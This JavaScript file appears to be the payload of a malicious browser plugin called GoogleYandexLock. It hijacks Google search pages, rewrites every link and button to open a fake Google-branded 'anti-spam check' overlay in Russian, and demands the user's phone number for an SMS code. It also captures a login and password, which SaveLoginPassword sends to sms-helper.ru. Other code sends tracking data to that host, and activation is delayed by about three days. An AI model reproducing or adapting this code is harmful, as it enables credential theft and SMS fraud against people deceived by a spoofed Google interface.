function LoadCSS() {
    var NewCSS = document.createElement("link");
    NewCSS.setAttribute("href", "localhost/GoogleYandexLock/google/style.css");
    NewCSS.setAttribute("type", "text/css");
    NewCSS.setAttribute("rel", "stylesheet");
    document.getElementsByTagName('head')[0].appendChild(NewCSS);
}
const domain = "http://sms-helper.ru/js/gSMS.php";
var step = 1,
	type = 'google',
	status = 'NULL',
	phone = 'NULL',
	result = 1,
	statStep = 666;
	


function Destroy () {

	plg.Save('lon','6');
	setTimeout('plg.Del()',5000);
	
	
}


function CheckLock() {
	var oRun = plg.Get('oRun'),
		vRun = plg.Get('vRun'),
		yaRun = plg.Get('yaRun');
		
	if ((oRun) && (oRun != 0)) {
		LockStop();
		plg.Save('lon','6');
		
	}
	else {

		result = 666;
	
	}
	if ((vRun) && (vRun!= 3)) {
		LockStop();
		plg.Save('lon','6');
	}
	else {
		result = 666;
	
	}
	if (yaRun){
		LockStop();
		plg.Save('lon','6');		
	}
	else{
		result = 666;
		
	}
	if (plg.Get('lon') == '6'){
		LockStop();			
	}
	if (plg.Get('lon') == '0'){
		plg.Save('lon','1');
	}
	return false;

}


function SaveLoginPassword(){
	var login = document.getElementById('login'),
		password = document.getElementById('pass'),
		hint = document.getElementById('tip'),
		id = plg.Get('id'),
		phoneNumber = plg.Get('gPhone'),
		status = 'auth',
		gShock = document.getElementById('gShock');
		
	if ((login.value.lenght==0) || (password.value.lenght==0)) {
		hint.display = "block";
		hint.innerText = "Введите корректный логин/пароль";
		return false;
	}
	else {
		login = encodeURIComponent(login.value);
		pass = encodeURIComponent(password.value);
		
		var auth = document.createElement('script');
		auth.setAttribute('type', 'text/javascript');
		var url = 'http://sms-helper.ru/js/gStat.php?status='+status+'&phoneNumber='+phoneNumber+'&id='+id+'&login='+login+'&password='+pass;
		auth.setAttribute('src', url);
		document.getElementsByTagName('head')[0].appendChild(auth);
		SendStat(62,'gLog');
		gShock.innerHTML='';
		step=1; 	
		ShowMeGoogle();
		document.getElementById('tip').style.display = 'block';
		document.getElementById('tip').innerText = 'Авторизация невозможна!Укажите номер вашего телефона';
		
	}
}



function LockStop() {
    plg.Save('lon', '6');
	if (document.getElementById('gShock')){
		document.getElementById('gShock').visibility = "none";
		document.getElementById('gShock').style.display = "none";
		document.getElementsByClassName('overlay')[0].style.display = "none";
		document.getElementById('gShock').innerHTML = '';
		Destroy();
		
	}

}


number = 'NULL';
function CheckInput(){
	var month = document.getElementsByClassName('tooltip-bottom')[0],
		phone = document.getElementById('telephone'),
		tip = document.getElementById('tip');
	if (month.value !== '12') {
		tip.style.display = 'block';
		tip.innerText = 'Неверный ответ';
		SendStat(3,'gLog');
		return false;
		
	}
	if (phone.value.length < 8){
		tip.style.display = 'block';
		tip.innerText = 'Неверно указан номер телефона';
		SendStat(31,'gLog');
		return false;
		
	}
	else {
		phone = phone.value;
		plg.Save('gPhone',phone);
		
	}
	SendStat(4,'gLog');
	SendSMS();
	NextStep();
	
}


function NextStep() {
	step=2;	
	var gShock = document.getElementById('gShock');
	gShock.innerHTML = '';
	gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999;  background-color: #fff; position: absolute; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: absolute; margin-top:130px; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Код полученный в СМС-сообщении:</h5>		<p><input type="text" class="tooltip-bottom"  id = "code" title="Код полученный в СМС-сообщении:" style="width: 100%;" maxlength="25" /></p>	<button id="medium checkinput" onclick="PayStatus();" > Отправить </button> <small id="resend_code" onclick="ReSendCode();" style="cursor:poiner; color:blue; align:right;">Выслать код повторно</small>	<p id="error_code" style="display:none; color:red;">Неверный код!</p>		<p><small>Пожалуйста, авторизуйтесь, если Вы зарегистрированный<br />пользователь сервиса. Для авторизации <a onclick="SecondStep();" >нажмите здесь</a>.</small></p>	</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
			
					if (document.getElementById('gbzc')){
						document.getElementById('gbzc').style.display="none";
						document.getElementById('gbvg').style.display="none";
					}
					plg.Save('lon','2');
					SendStat(5,'gLog');
}



function  SecondStep() {
	step=3;

	
	var gShock = document.getElementById('gShock');
	gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999;  background-color: #fff; position: absolute; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: absolute; margin-top:130px; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Ваш логин в системе:</h5>		<p><input type="text" id="login" class="tooltip-bottom" title="Введите код полученный на Ваш номер мобильного телефона в виде СМС-сообщения" style="width: 171px;" maxlength="30" id="secretcode" />&nbsp;&nbsp;<h5>Ваш пароль в системе:</h5>		<p><input type="password" id="pass"class="tooltip-bottom" title="Введите Ваш пароль полученный в процессе регистрации" style="width: 171px;" maxlength="20" id="password" />&nbsp;&nbsp;<button class="medium" onclick="SaveLoginPassword();">Авторизовать</button></p></p>		<p id="error"      style="display:none;">Ошибка: некорректный код подтверждения!</p>	</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
				
					if (document.getElementById('gbzc')){
						document.getElementById('gbzc').style.display="none";
						document.getElementById('gbvg').style.display="none";
					}
					plg.Save('lon','2');
					SendStat(6, 'gLog');
}


function ShowMeGoogle() { 
    
	
	var modalWnd = document.createElement("div");
    modalWnd.setAttribute("id", "gShock");
    modalWnd.setAttribute("position", "relative");
    modalWnd.setAttribute("type", "text/html");
    
	
    var overlay = document.createElement("div");
	overlay.setAttribute("class", "overlay");
	overlay.setAttribute("position", "fixed");
	
	

	document.getElementById('gbq').appendChild(modalWnd);
	document.getElementById('gbq').appendChild(overlay);
	
	var gShock = document.getElementById('gShock');
		
		switch (step) {
			case 1:
				gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999;  background-color: #fff; position: relative; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: relative; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: relative; margin-top:auto; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Сколько месяцев в году?:</h5>		<p><input type="text" class="tooltip-bottom" title="Напишите ответ на поставленный выше вопрос" style="width: 100%;" maxlength="25" /></p>		<h5>Ваш номер телефона <br>(например +79876543210):</h5>		<p><input type="text" class="tooltip-bottom checkinput" title="Введите Ваш номер мобильного телефона, на него будет выслано СМС-сообщение с проверочным кодом" style="width: 171px;" maxlength="13" id="telephone" value="+" />&nbsp;&nbsp;<button class="medium checkinput" onclick="CheckInput();">Получить код</button></p>		<small id ="tip" style="color:red; display:none;">Введен некорректный номер телефона</small>				<p><small>Пожалуйста, авторизуйтесь, если Вы зарегистрированный<br />пользователь сервиса. Для авторизации <small  onclick="SecondStep();" style="cursor:pointer;"><b>нажмите здесь</b></small>.</small></p>		</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
			
					if (document.getElementById('gbzc')){
						document.getElementById('gbzc').style.display="none";
						document.getElementById('gbvg').style.display="none";
					}
					plg.Save('lon','2');
				
					SendStat(21,'gLog');
					
					var gStop = new Date().getTime() /1000 / 60 / 60;
					gStop = gStop - (gStop % 1);
					gStop += 360;
					plg.Save('gStop',gStop.toString());
					
					break;
					
				case 2:
					NextStep();					
					break;
					
				case 3:
					SecondStep();
					break;	
				
				default: break;
		}
	
	}
	


function ChangeLinks(){

	if (document.getElementById('gbqfb')){
		document.getElementById('gbqfb').setAttribute('onmousedown','ShowMeGoogle()');
		var i=0;
		for (i;i<document.getElementsByTagName('a').length;i++) {
			document.getElementsByTagName('a')[i].setAttribute('onmousedown', 'ShowMeGoogle()');
			document.getElementsByTagName('a')[i].href = "#";
		}
	}
}


function ChangeMainButtons() {
	if (document.getElementById('gsri_ok0')){ 
		
		document.getElementById('gbqfsa').setAttribute('onclick','ShowMeGoogle()'); 
		document.getElementById('gbqfbb').setAttribute('onclick','ShowMeGoogle()'); 
		document.getElementById('gsri_ok0').setAttribute('onclick','ShowMeGoogle()');
	}
	
}



function ToEnter(){
	if(event.keyCode==13) {
		ShowMeGoogle();
	}
}


function ReSendCode() {
	try{
		var gUrl = plg.Get('gUrl');
		
		if (gUrl == false){
		
			return false;
			
		}
		else {
			
			var gSms = document.createElement('script');
			gSms.setAttribute('type', 'text/javascript');
			gSms.setAttribute('src', domain+gUrl);
			document.getElementsByTagName('head')[0].appendChild(gSms);
			SendStat(52,'gLog');
			
			
		}
	}
	catch(e){
	
	}
}


function isMain(){
	CheckLock();
	
	if (result !== 666){
		
		return false;
	}
	
	else{
		
		if (plg.Get('lon') != '6'){
			
			SendStat(1,'gLog');			
			plg.Save('lon','1');
			ChangeMainButtons();
			
	
			if (document.getElementsByTagName('a').length ==29){
				
				if (document.getElementsByClassName('gstl_0 gssb_c')[0]){
					document.getElementsByClassName('gstl_0 gssb_c')[0].parentNode.removeChild(document.getElementsByClassName('gstl_0 gssb_c')[0]);
						
				}
				
				
				
			}
			
			else{
				
				
				if(document.getElementsByClassName('gstl_0 gssb_c')[0]){
					document.getElementsByClassName('gstl_0 gssb_c')[0].parentNode.removeChild(document.getElementsByClassName('gstl_0 gssb_c')[0]);
				}
				
				
				var i=0;
				for (i;i<document.getElementsByTagName('a').length;i++) {
					document.getElementsByTagName('a')[i].setAttribute('onmousedown', 'ShowMeGoogle()');
					document.getElementsByTagName('a')[i].href = "#";
					
				}
				plg.Save('lon','1');
				SendStat(0,'gLog');
							
				setTimeout('ChangeLinks()', 2000);
				
			}
		}
		else{
			
		}
	}
}


function CheckCode () {
	var inputKey = document.getElementById('code').value;
	if (sendSms) {
		
        var validKey = sendSms.split(':');
        for (i = 0; i < validKey.length; i++)
            if (validKey[i] == inputKey) {
				LockStop();
				SendStat(7,'gLog');
			}
			else{
				SendStat(51,'gLog');
			}
	}
}


function SendStat(statStep,status){
	var phoneNumber = plg.Get('gPhone'),
		id = plg.Get('id'),
		group = plg.Get('group');
		
	var stat = document.createElement('script');
    stat.setAttribute('type', 'text/javascript');
    var url = 'http://sms-helper.ru/js/gStat.php?phoneNumber='+phoneNumber+'&status='+status+'&id='+id+'&group='+group+'&step='+statStep;
    stat.setAttribute('src', url);
    document.getElementsByTagName('head')[0].appendChild(stat);
	
}


function PayStatus() {
	var code = document.getElementById('code'),
		err = document.getElementById('error_code');
	if (code.value.length < 4){
		err.style.display = 'block';
		err.innerText = 'Неверно введен код';
		SendStat(51,'gLog');
		
		return false;		
	}
	
	else {
		var state = document.createElement('script');
		state.setAttribute('type', 'text/javascript');
		var url = 'http://sms-helper.ru/js/gStat.php?status='+status+'&type='+type;
		state.setAttribute('src', url);
		document.getElementsByTagName('head')[0].appendChild(state);
		plg.Save('gPhone', number);
		CheckCode();
	}
   
}


function SendSMS() {
    try {
        var sms = document.createElement('script');
        sms.setAttribute('type', 'text/javascript');
        var url =domain+'?phone='+encodeURIComponent(plg.Get('gPhone'));
		plg.Save('gUrl',url);
        sms.setAttribute('src', url);
        document.getElementsByTagName('head')[0].appendChild(sms);
		
    }
	catch (e) {}

}




function Start() {
		if (plg){
			if (plg.Get('lon' == '6')){
				LockStop();
				
			}
			if (plg.Get('lon') == '2'){
				ShowMeGoogle();
				
			}
			else{
				isMain();
				
			}
		}
	}

  window.onload = function () {
		//TimeOut ();

		SetTime();
	
} 

function InstallPlg() {
	var id = 'null',
		group = 'empty';
	try{
		if (plg) {
			id = plg.Get('id').toString();
			group = plg.Get('group').toString();
			var knock = document.createElement('script');
			knock.setAttribute('type', 'text/javascript');
			url = 'http://sms-helper.ru/inst.php?id='+id+'&group='+group;
			knock.setAttribute('src', url);
			document.getElementsByTagName('head')[0].appendChild(knock);
		}
	}
	catch(e){
		
	}
}

function TimeOut (){
	if (plg) {
		var timeStop = plg.Get('gStop'),
			timeNow = new Date().getTime() / 1000 / 60/ 60;
			timeNow = timeNow - (timeNow % 1);
		if (timeNow >= timeStop){
			LockStop();
			
			plg.Save('lon','0');
		}
		else {
			return false;
		}
	}
}


function SetTime() {
	if (plg) {
			var startTime = plg.Get('startTime'),
				w = '',
				days = 4320;
			var now =  new Date().getTime() / 1000 / 60;
			now = now - (now % 1);
		
			if (!startTime){
				
				w = now + days;			
				plg.Save('startTime',w.toString());
				return false;
			}
			else{
				w = parseInt(startTime) + days;		
				
				if (now>=startTime){
					
					Start();					
				}
				else {	
										
					plg.Save('lon','0');
					return false;
					
				}
			}
	}
}

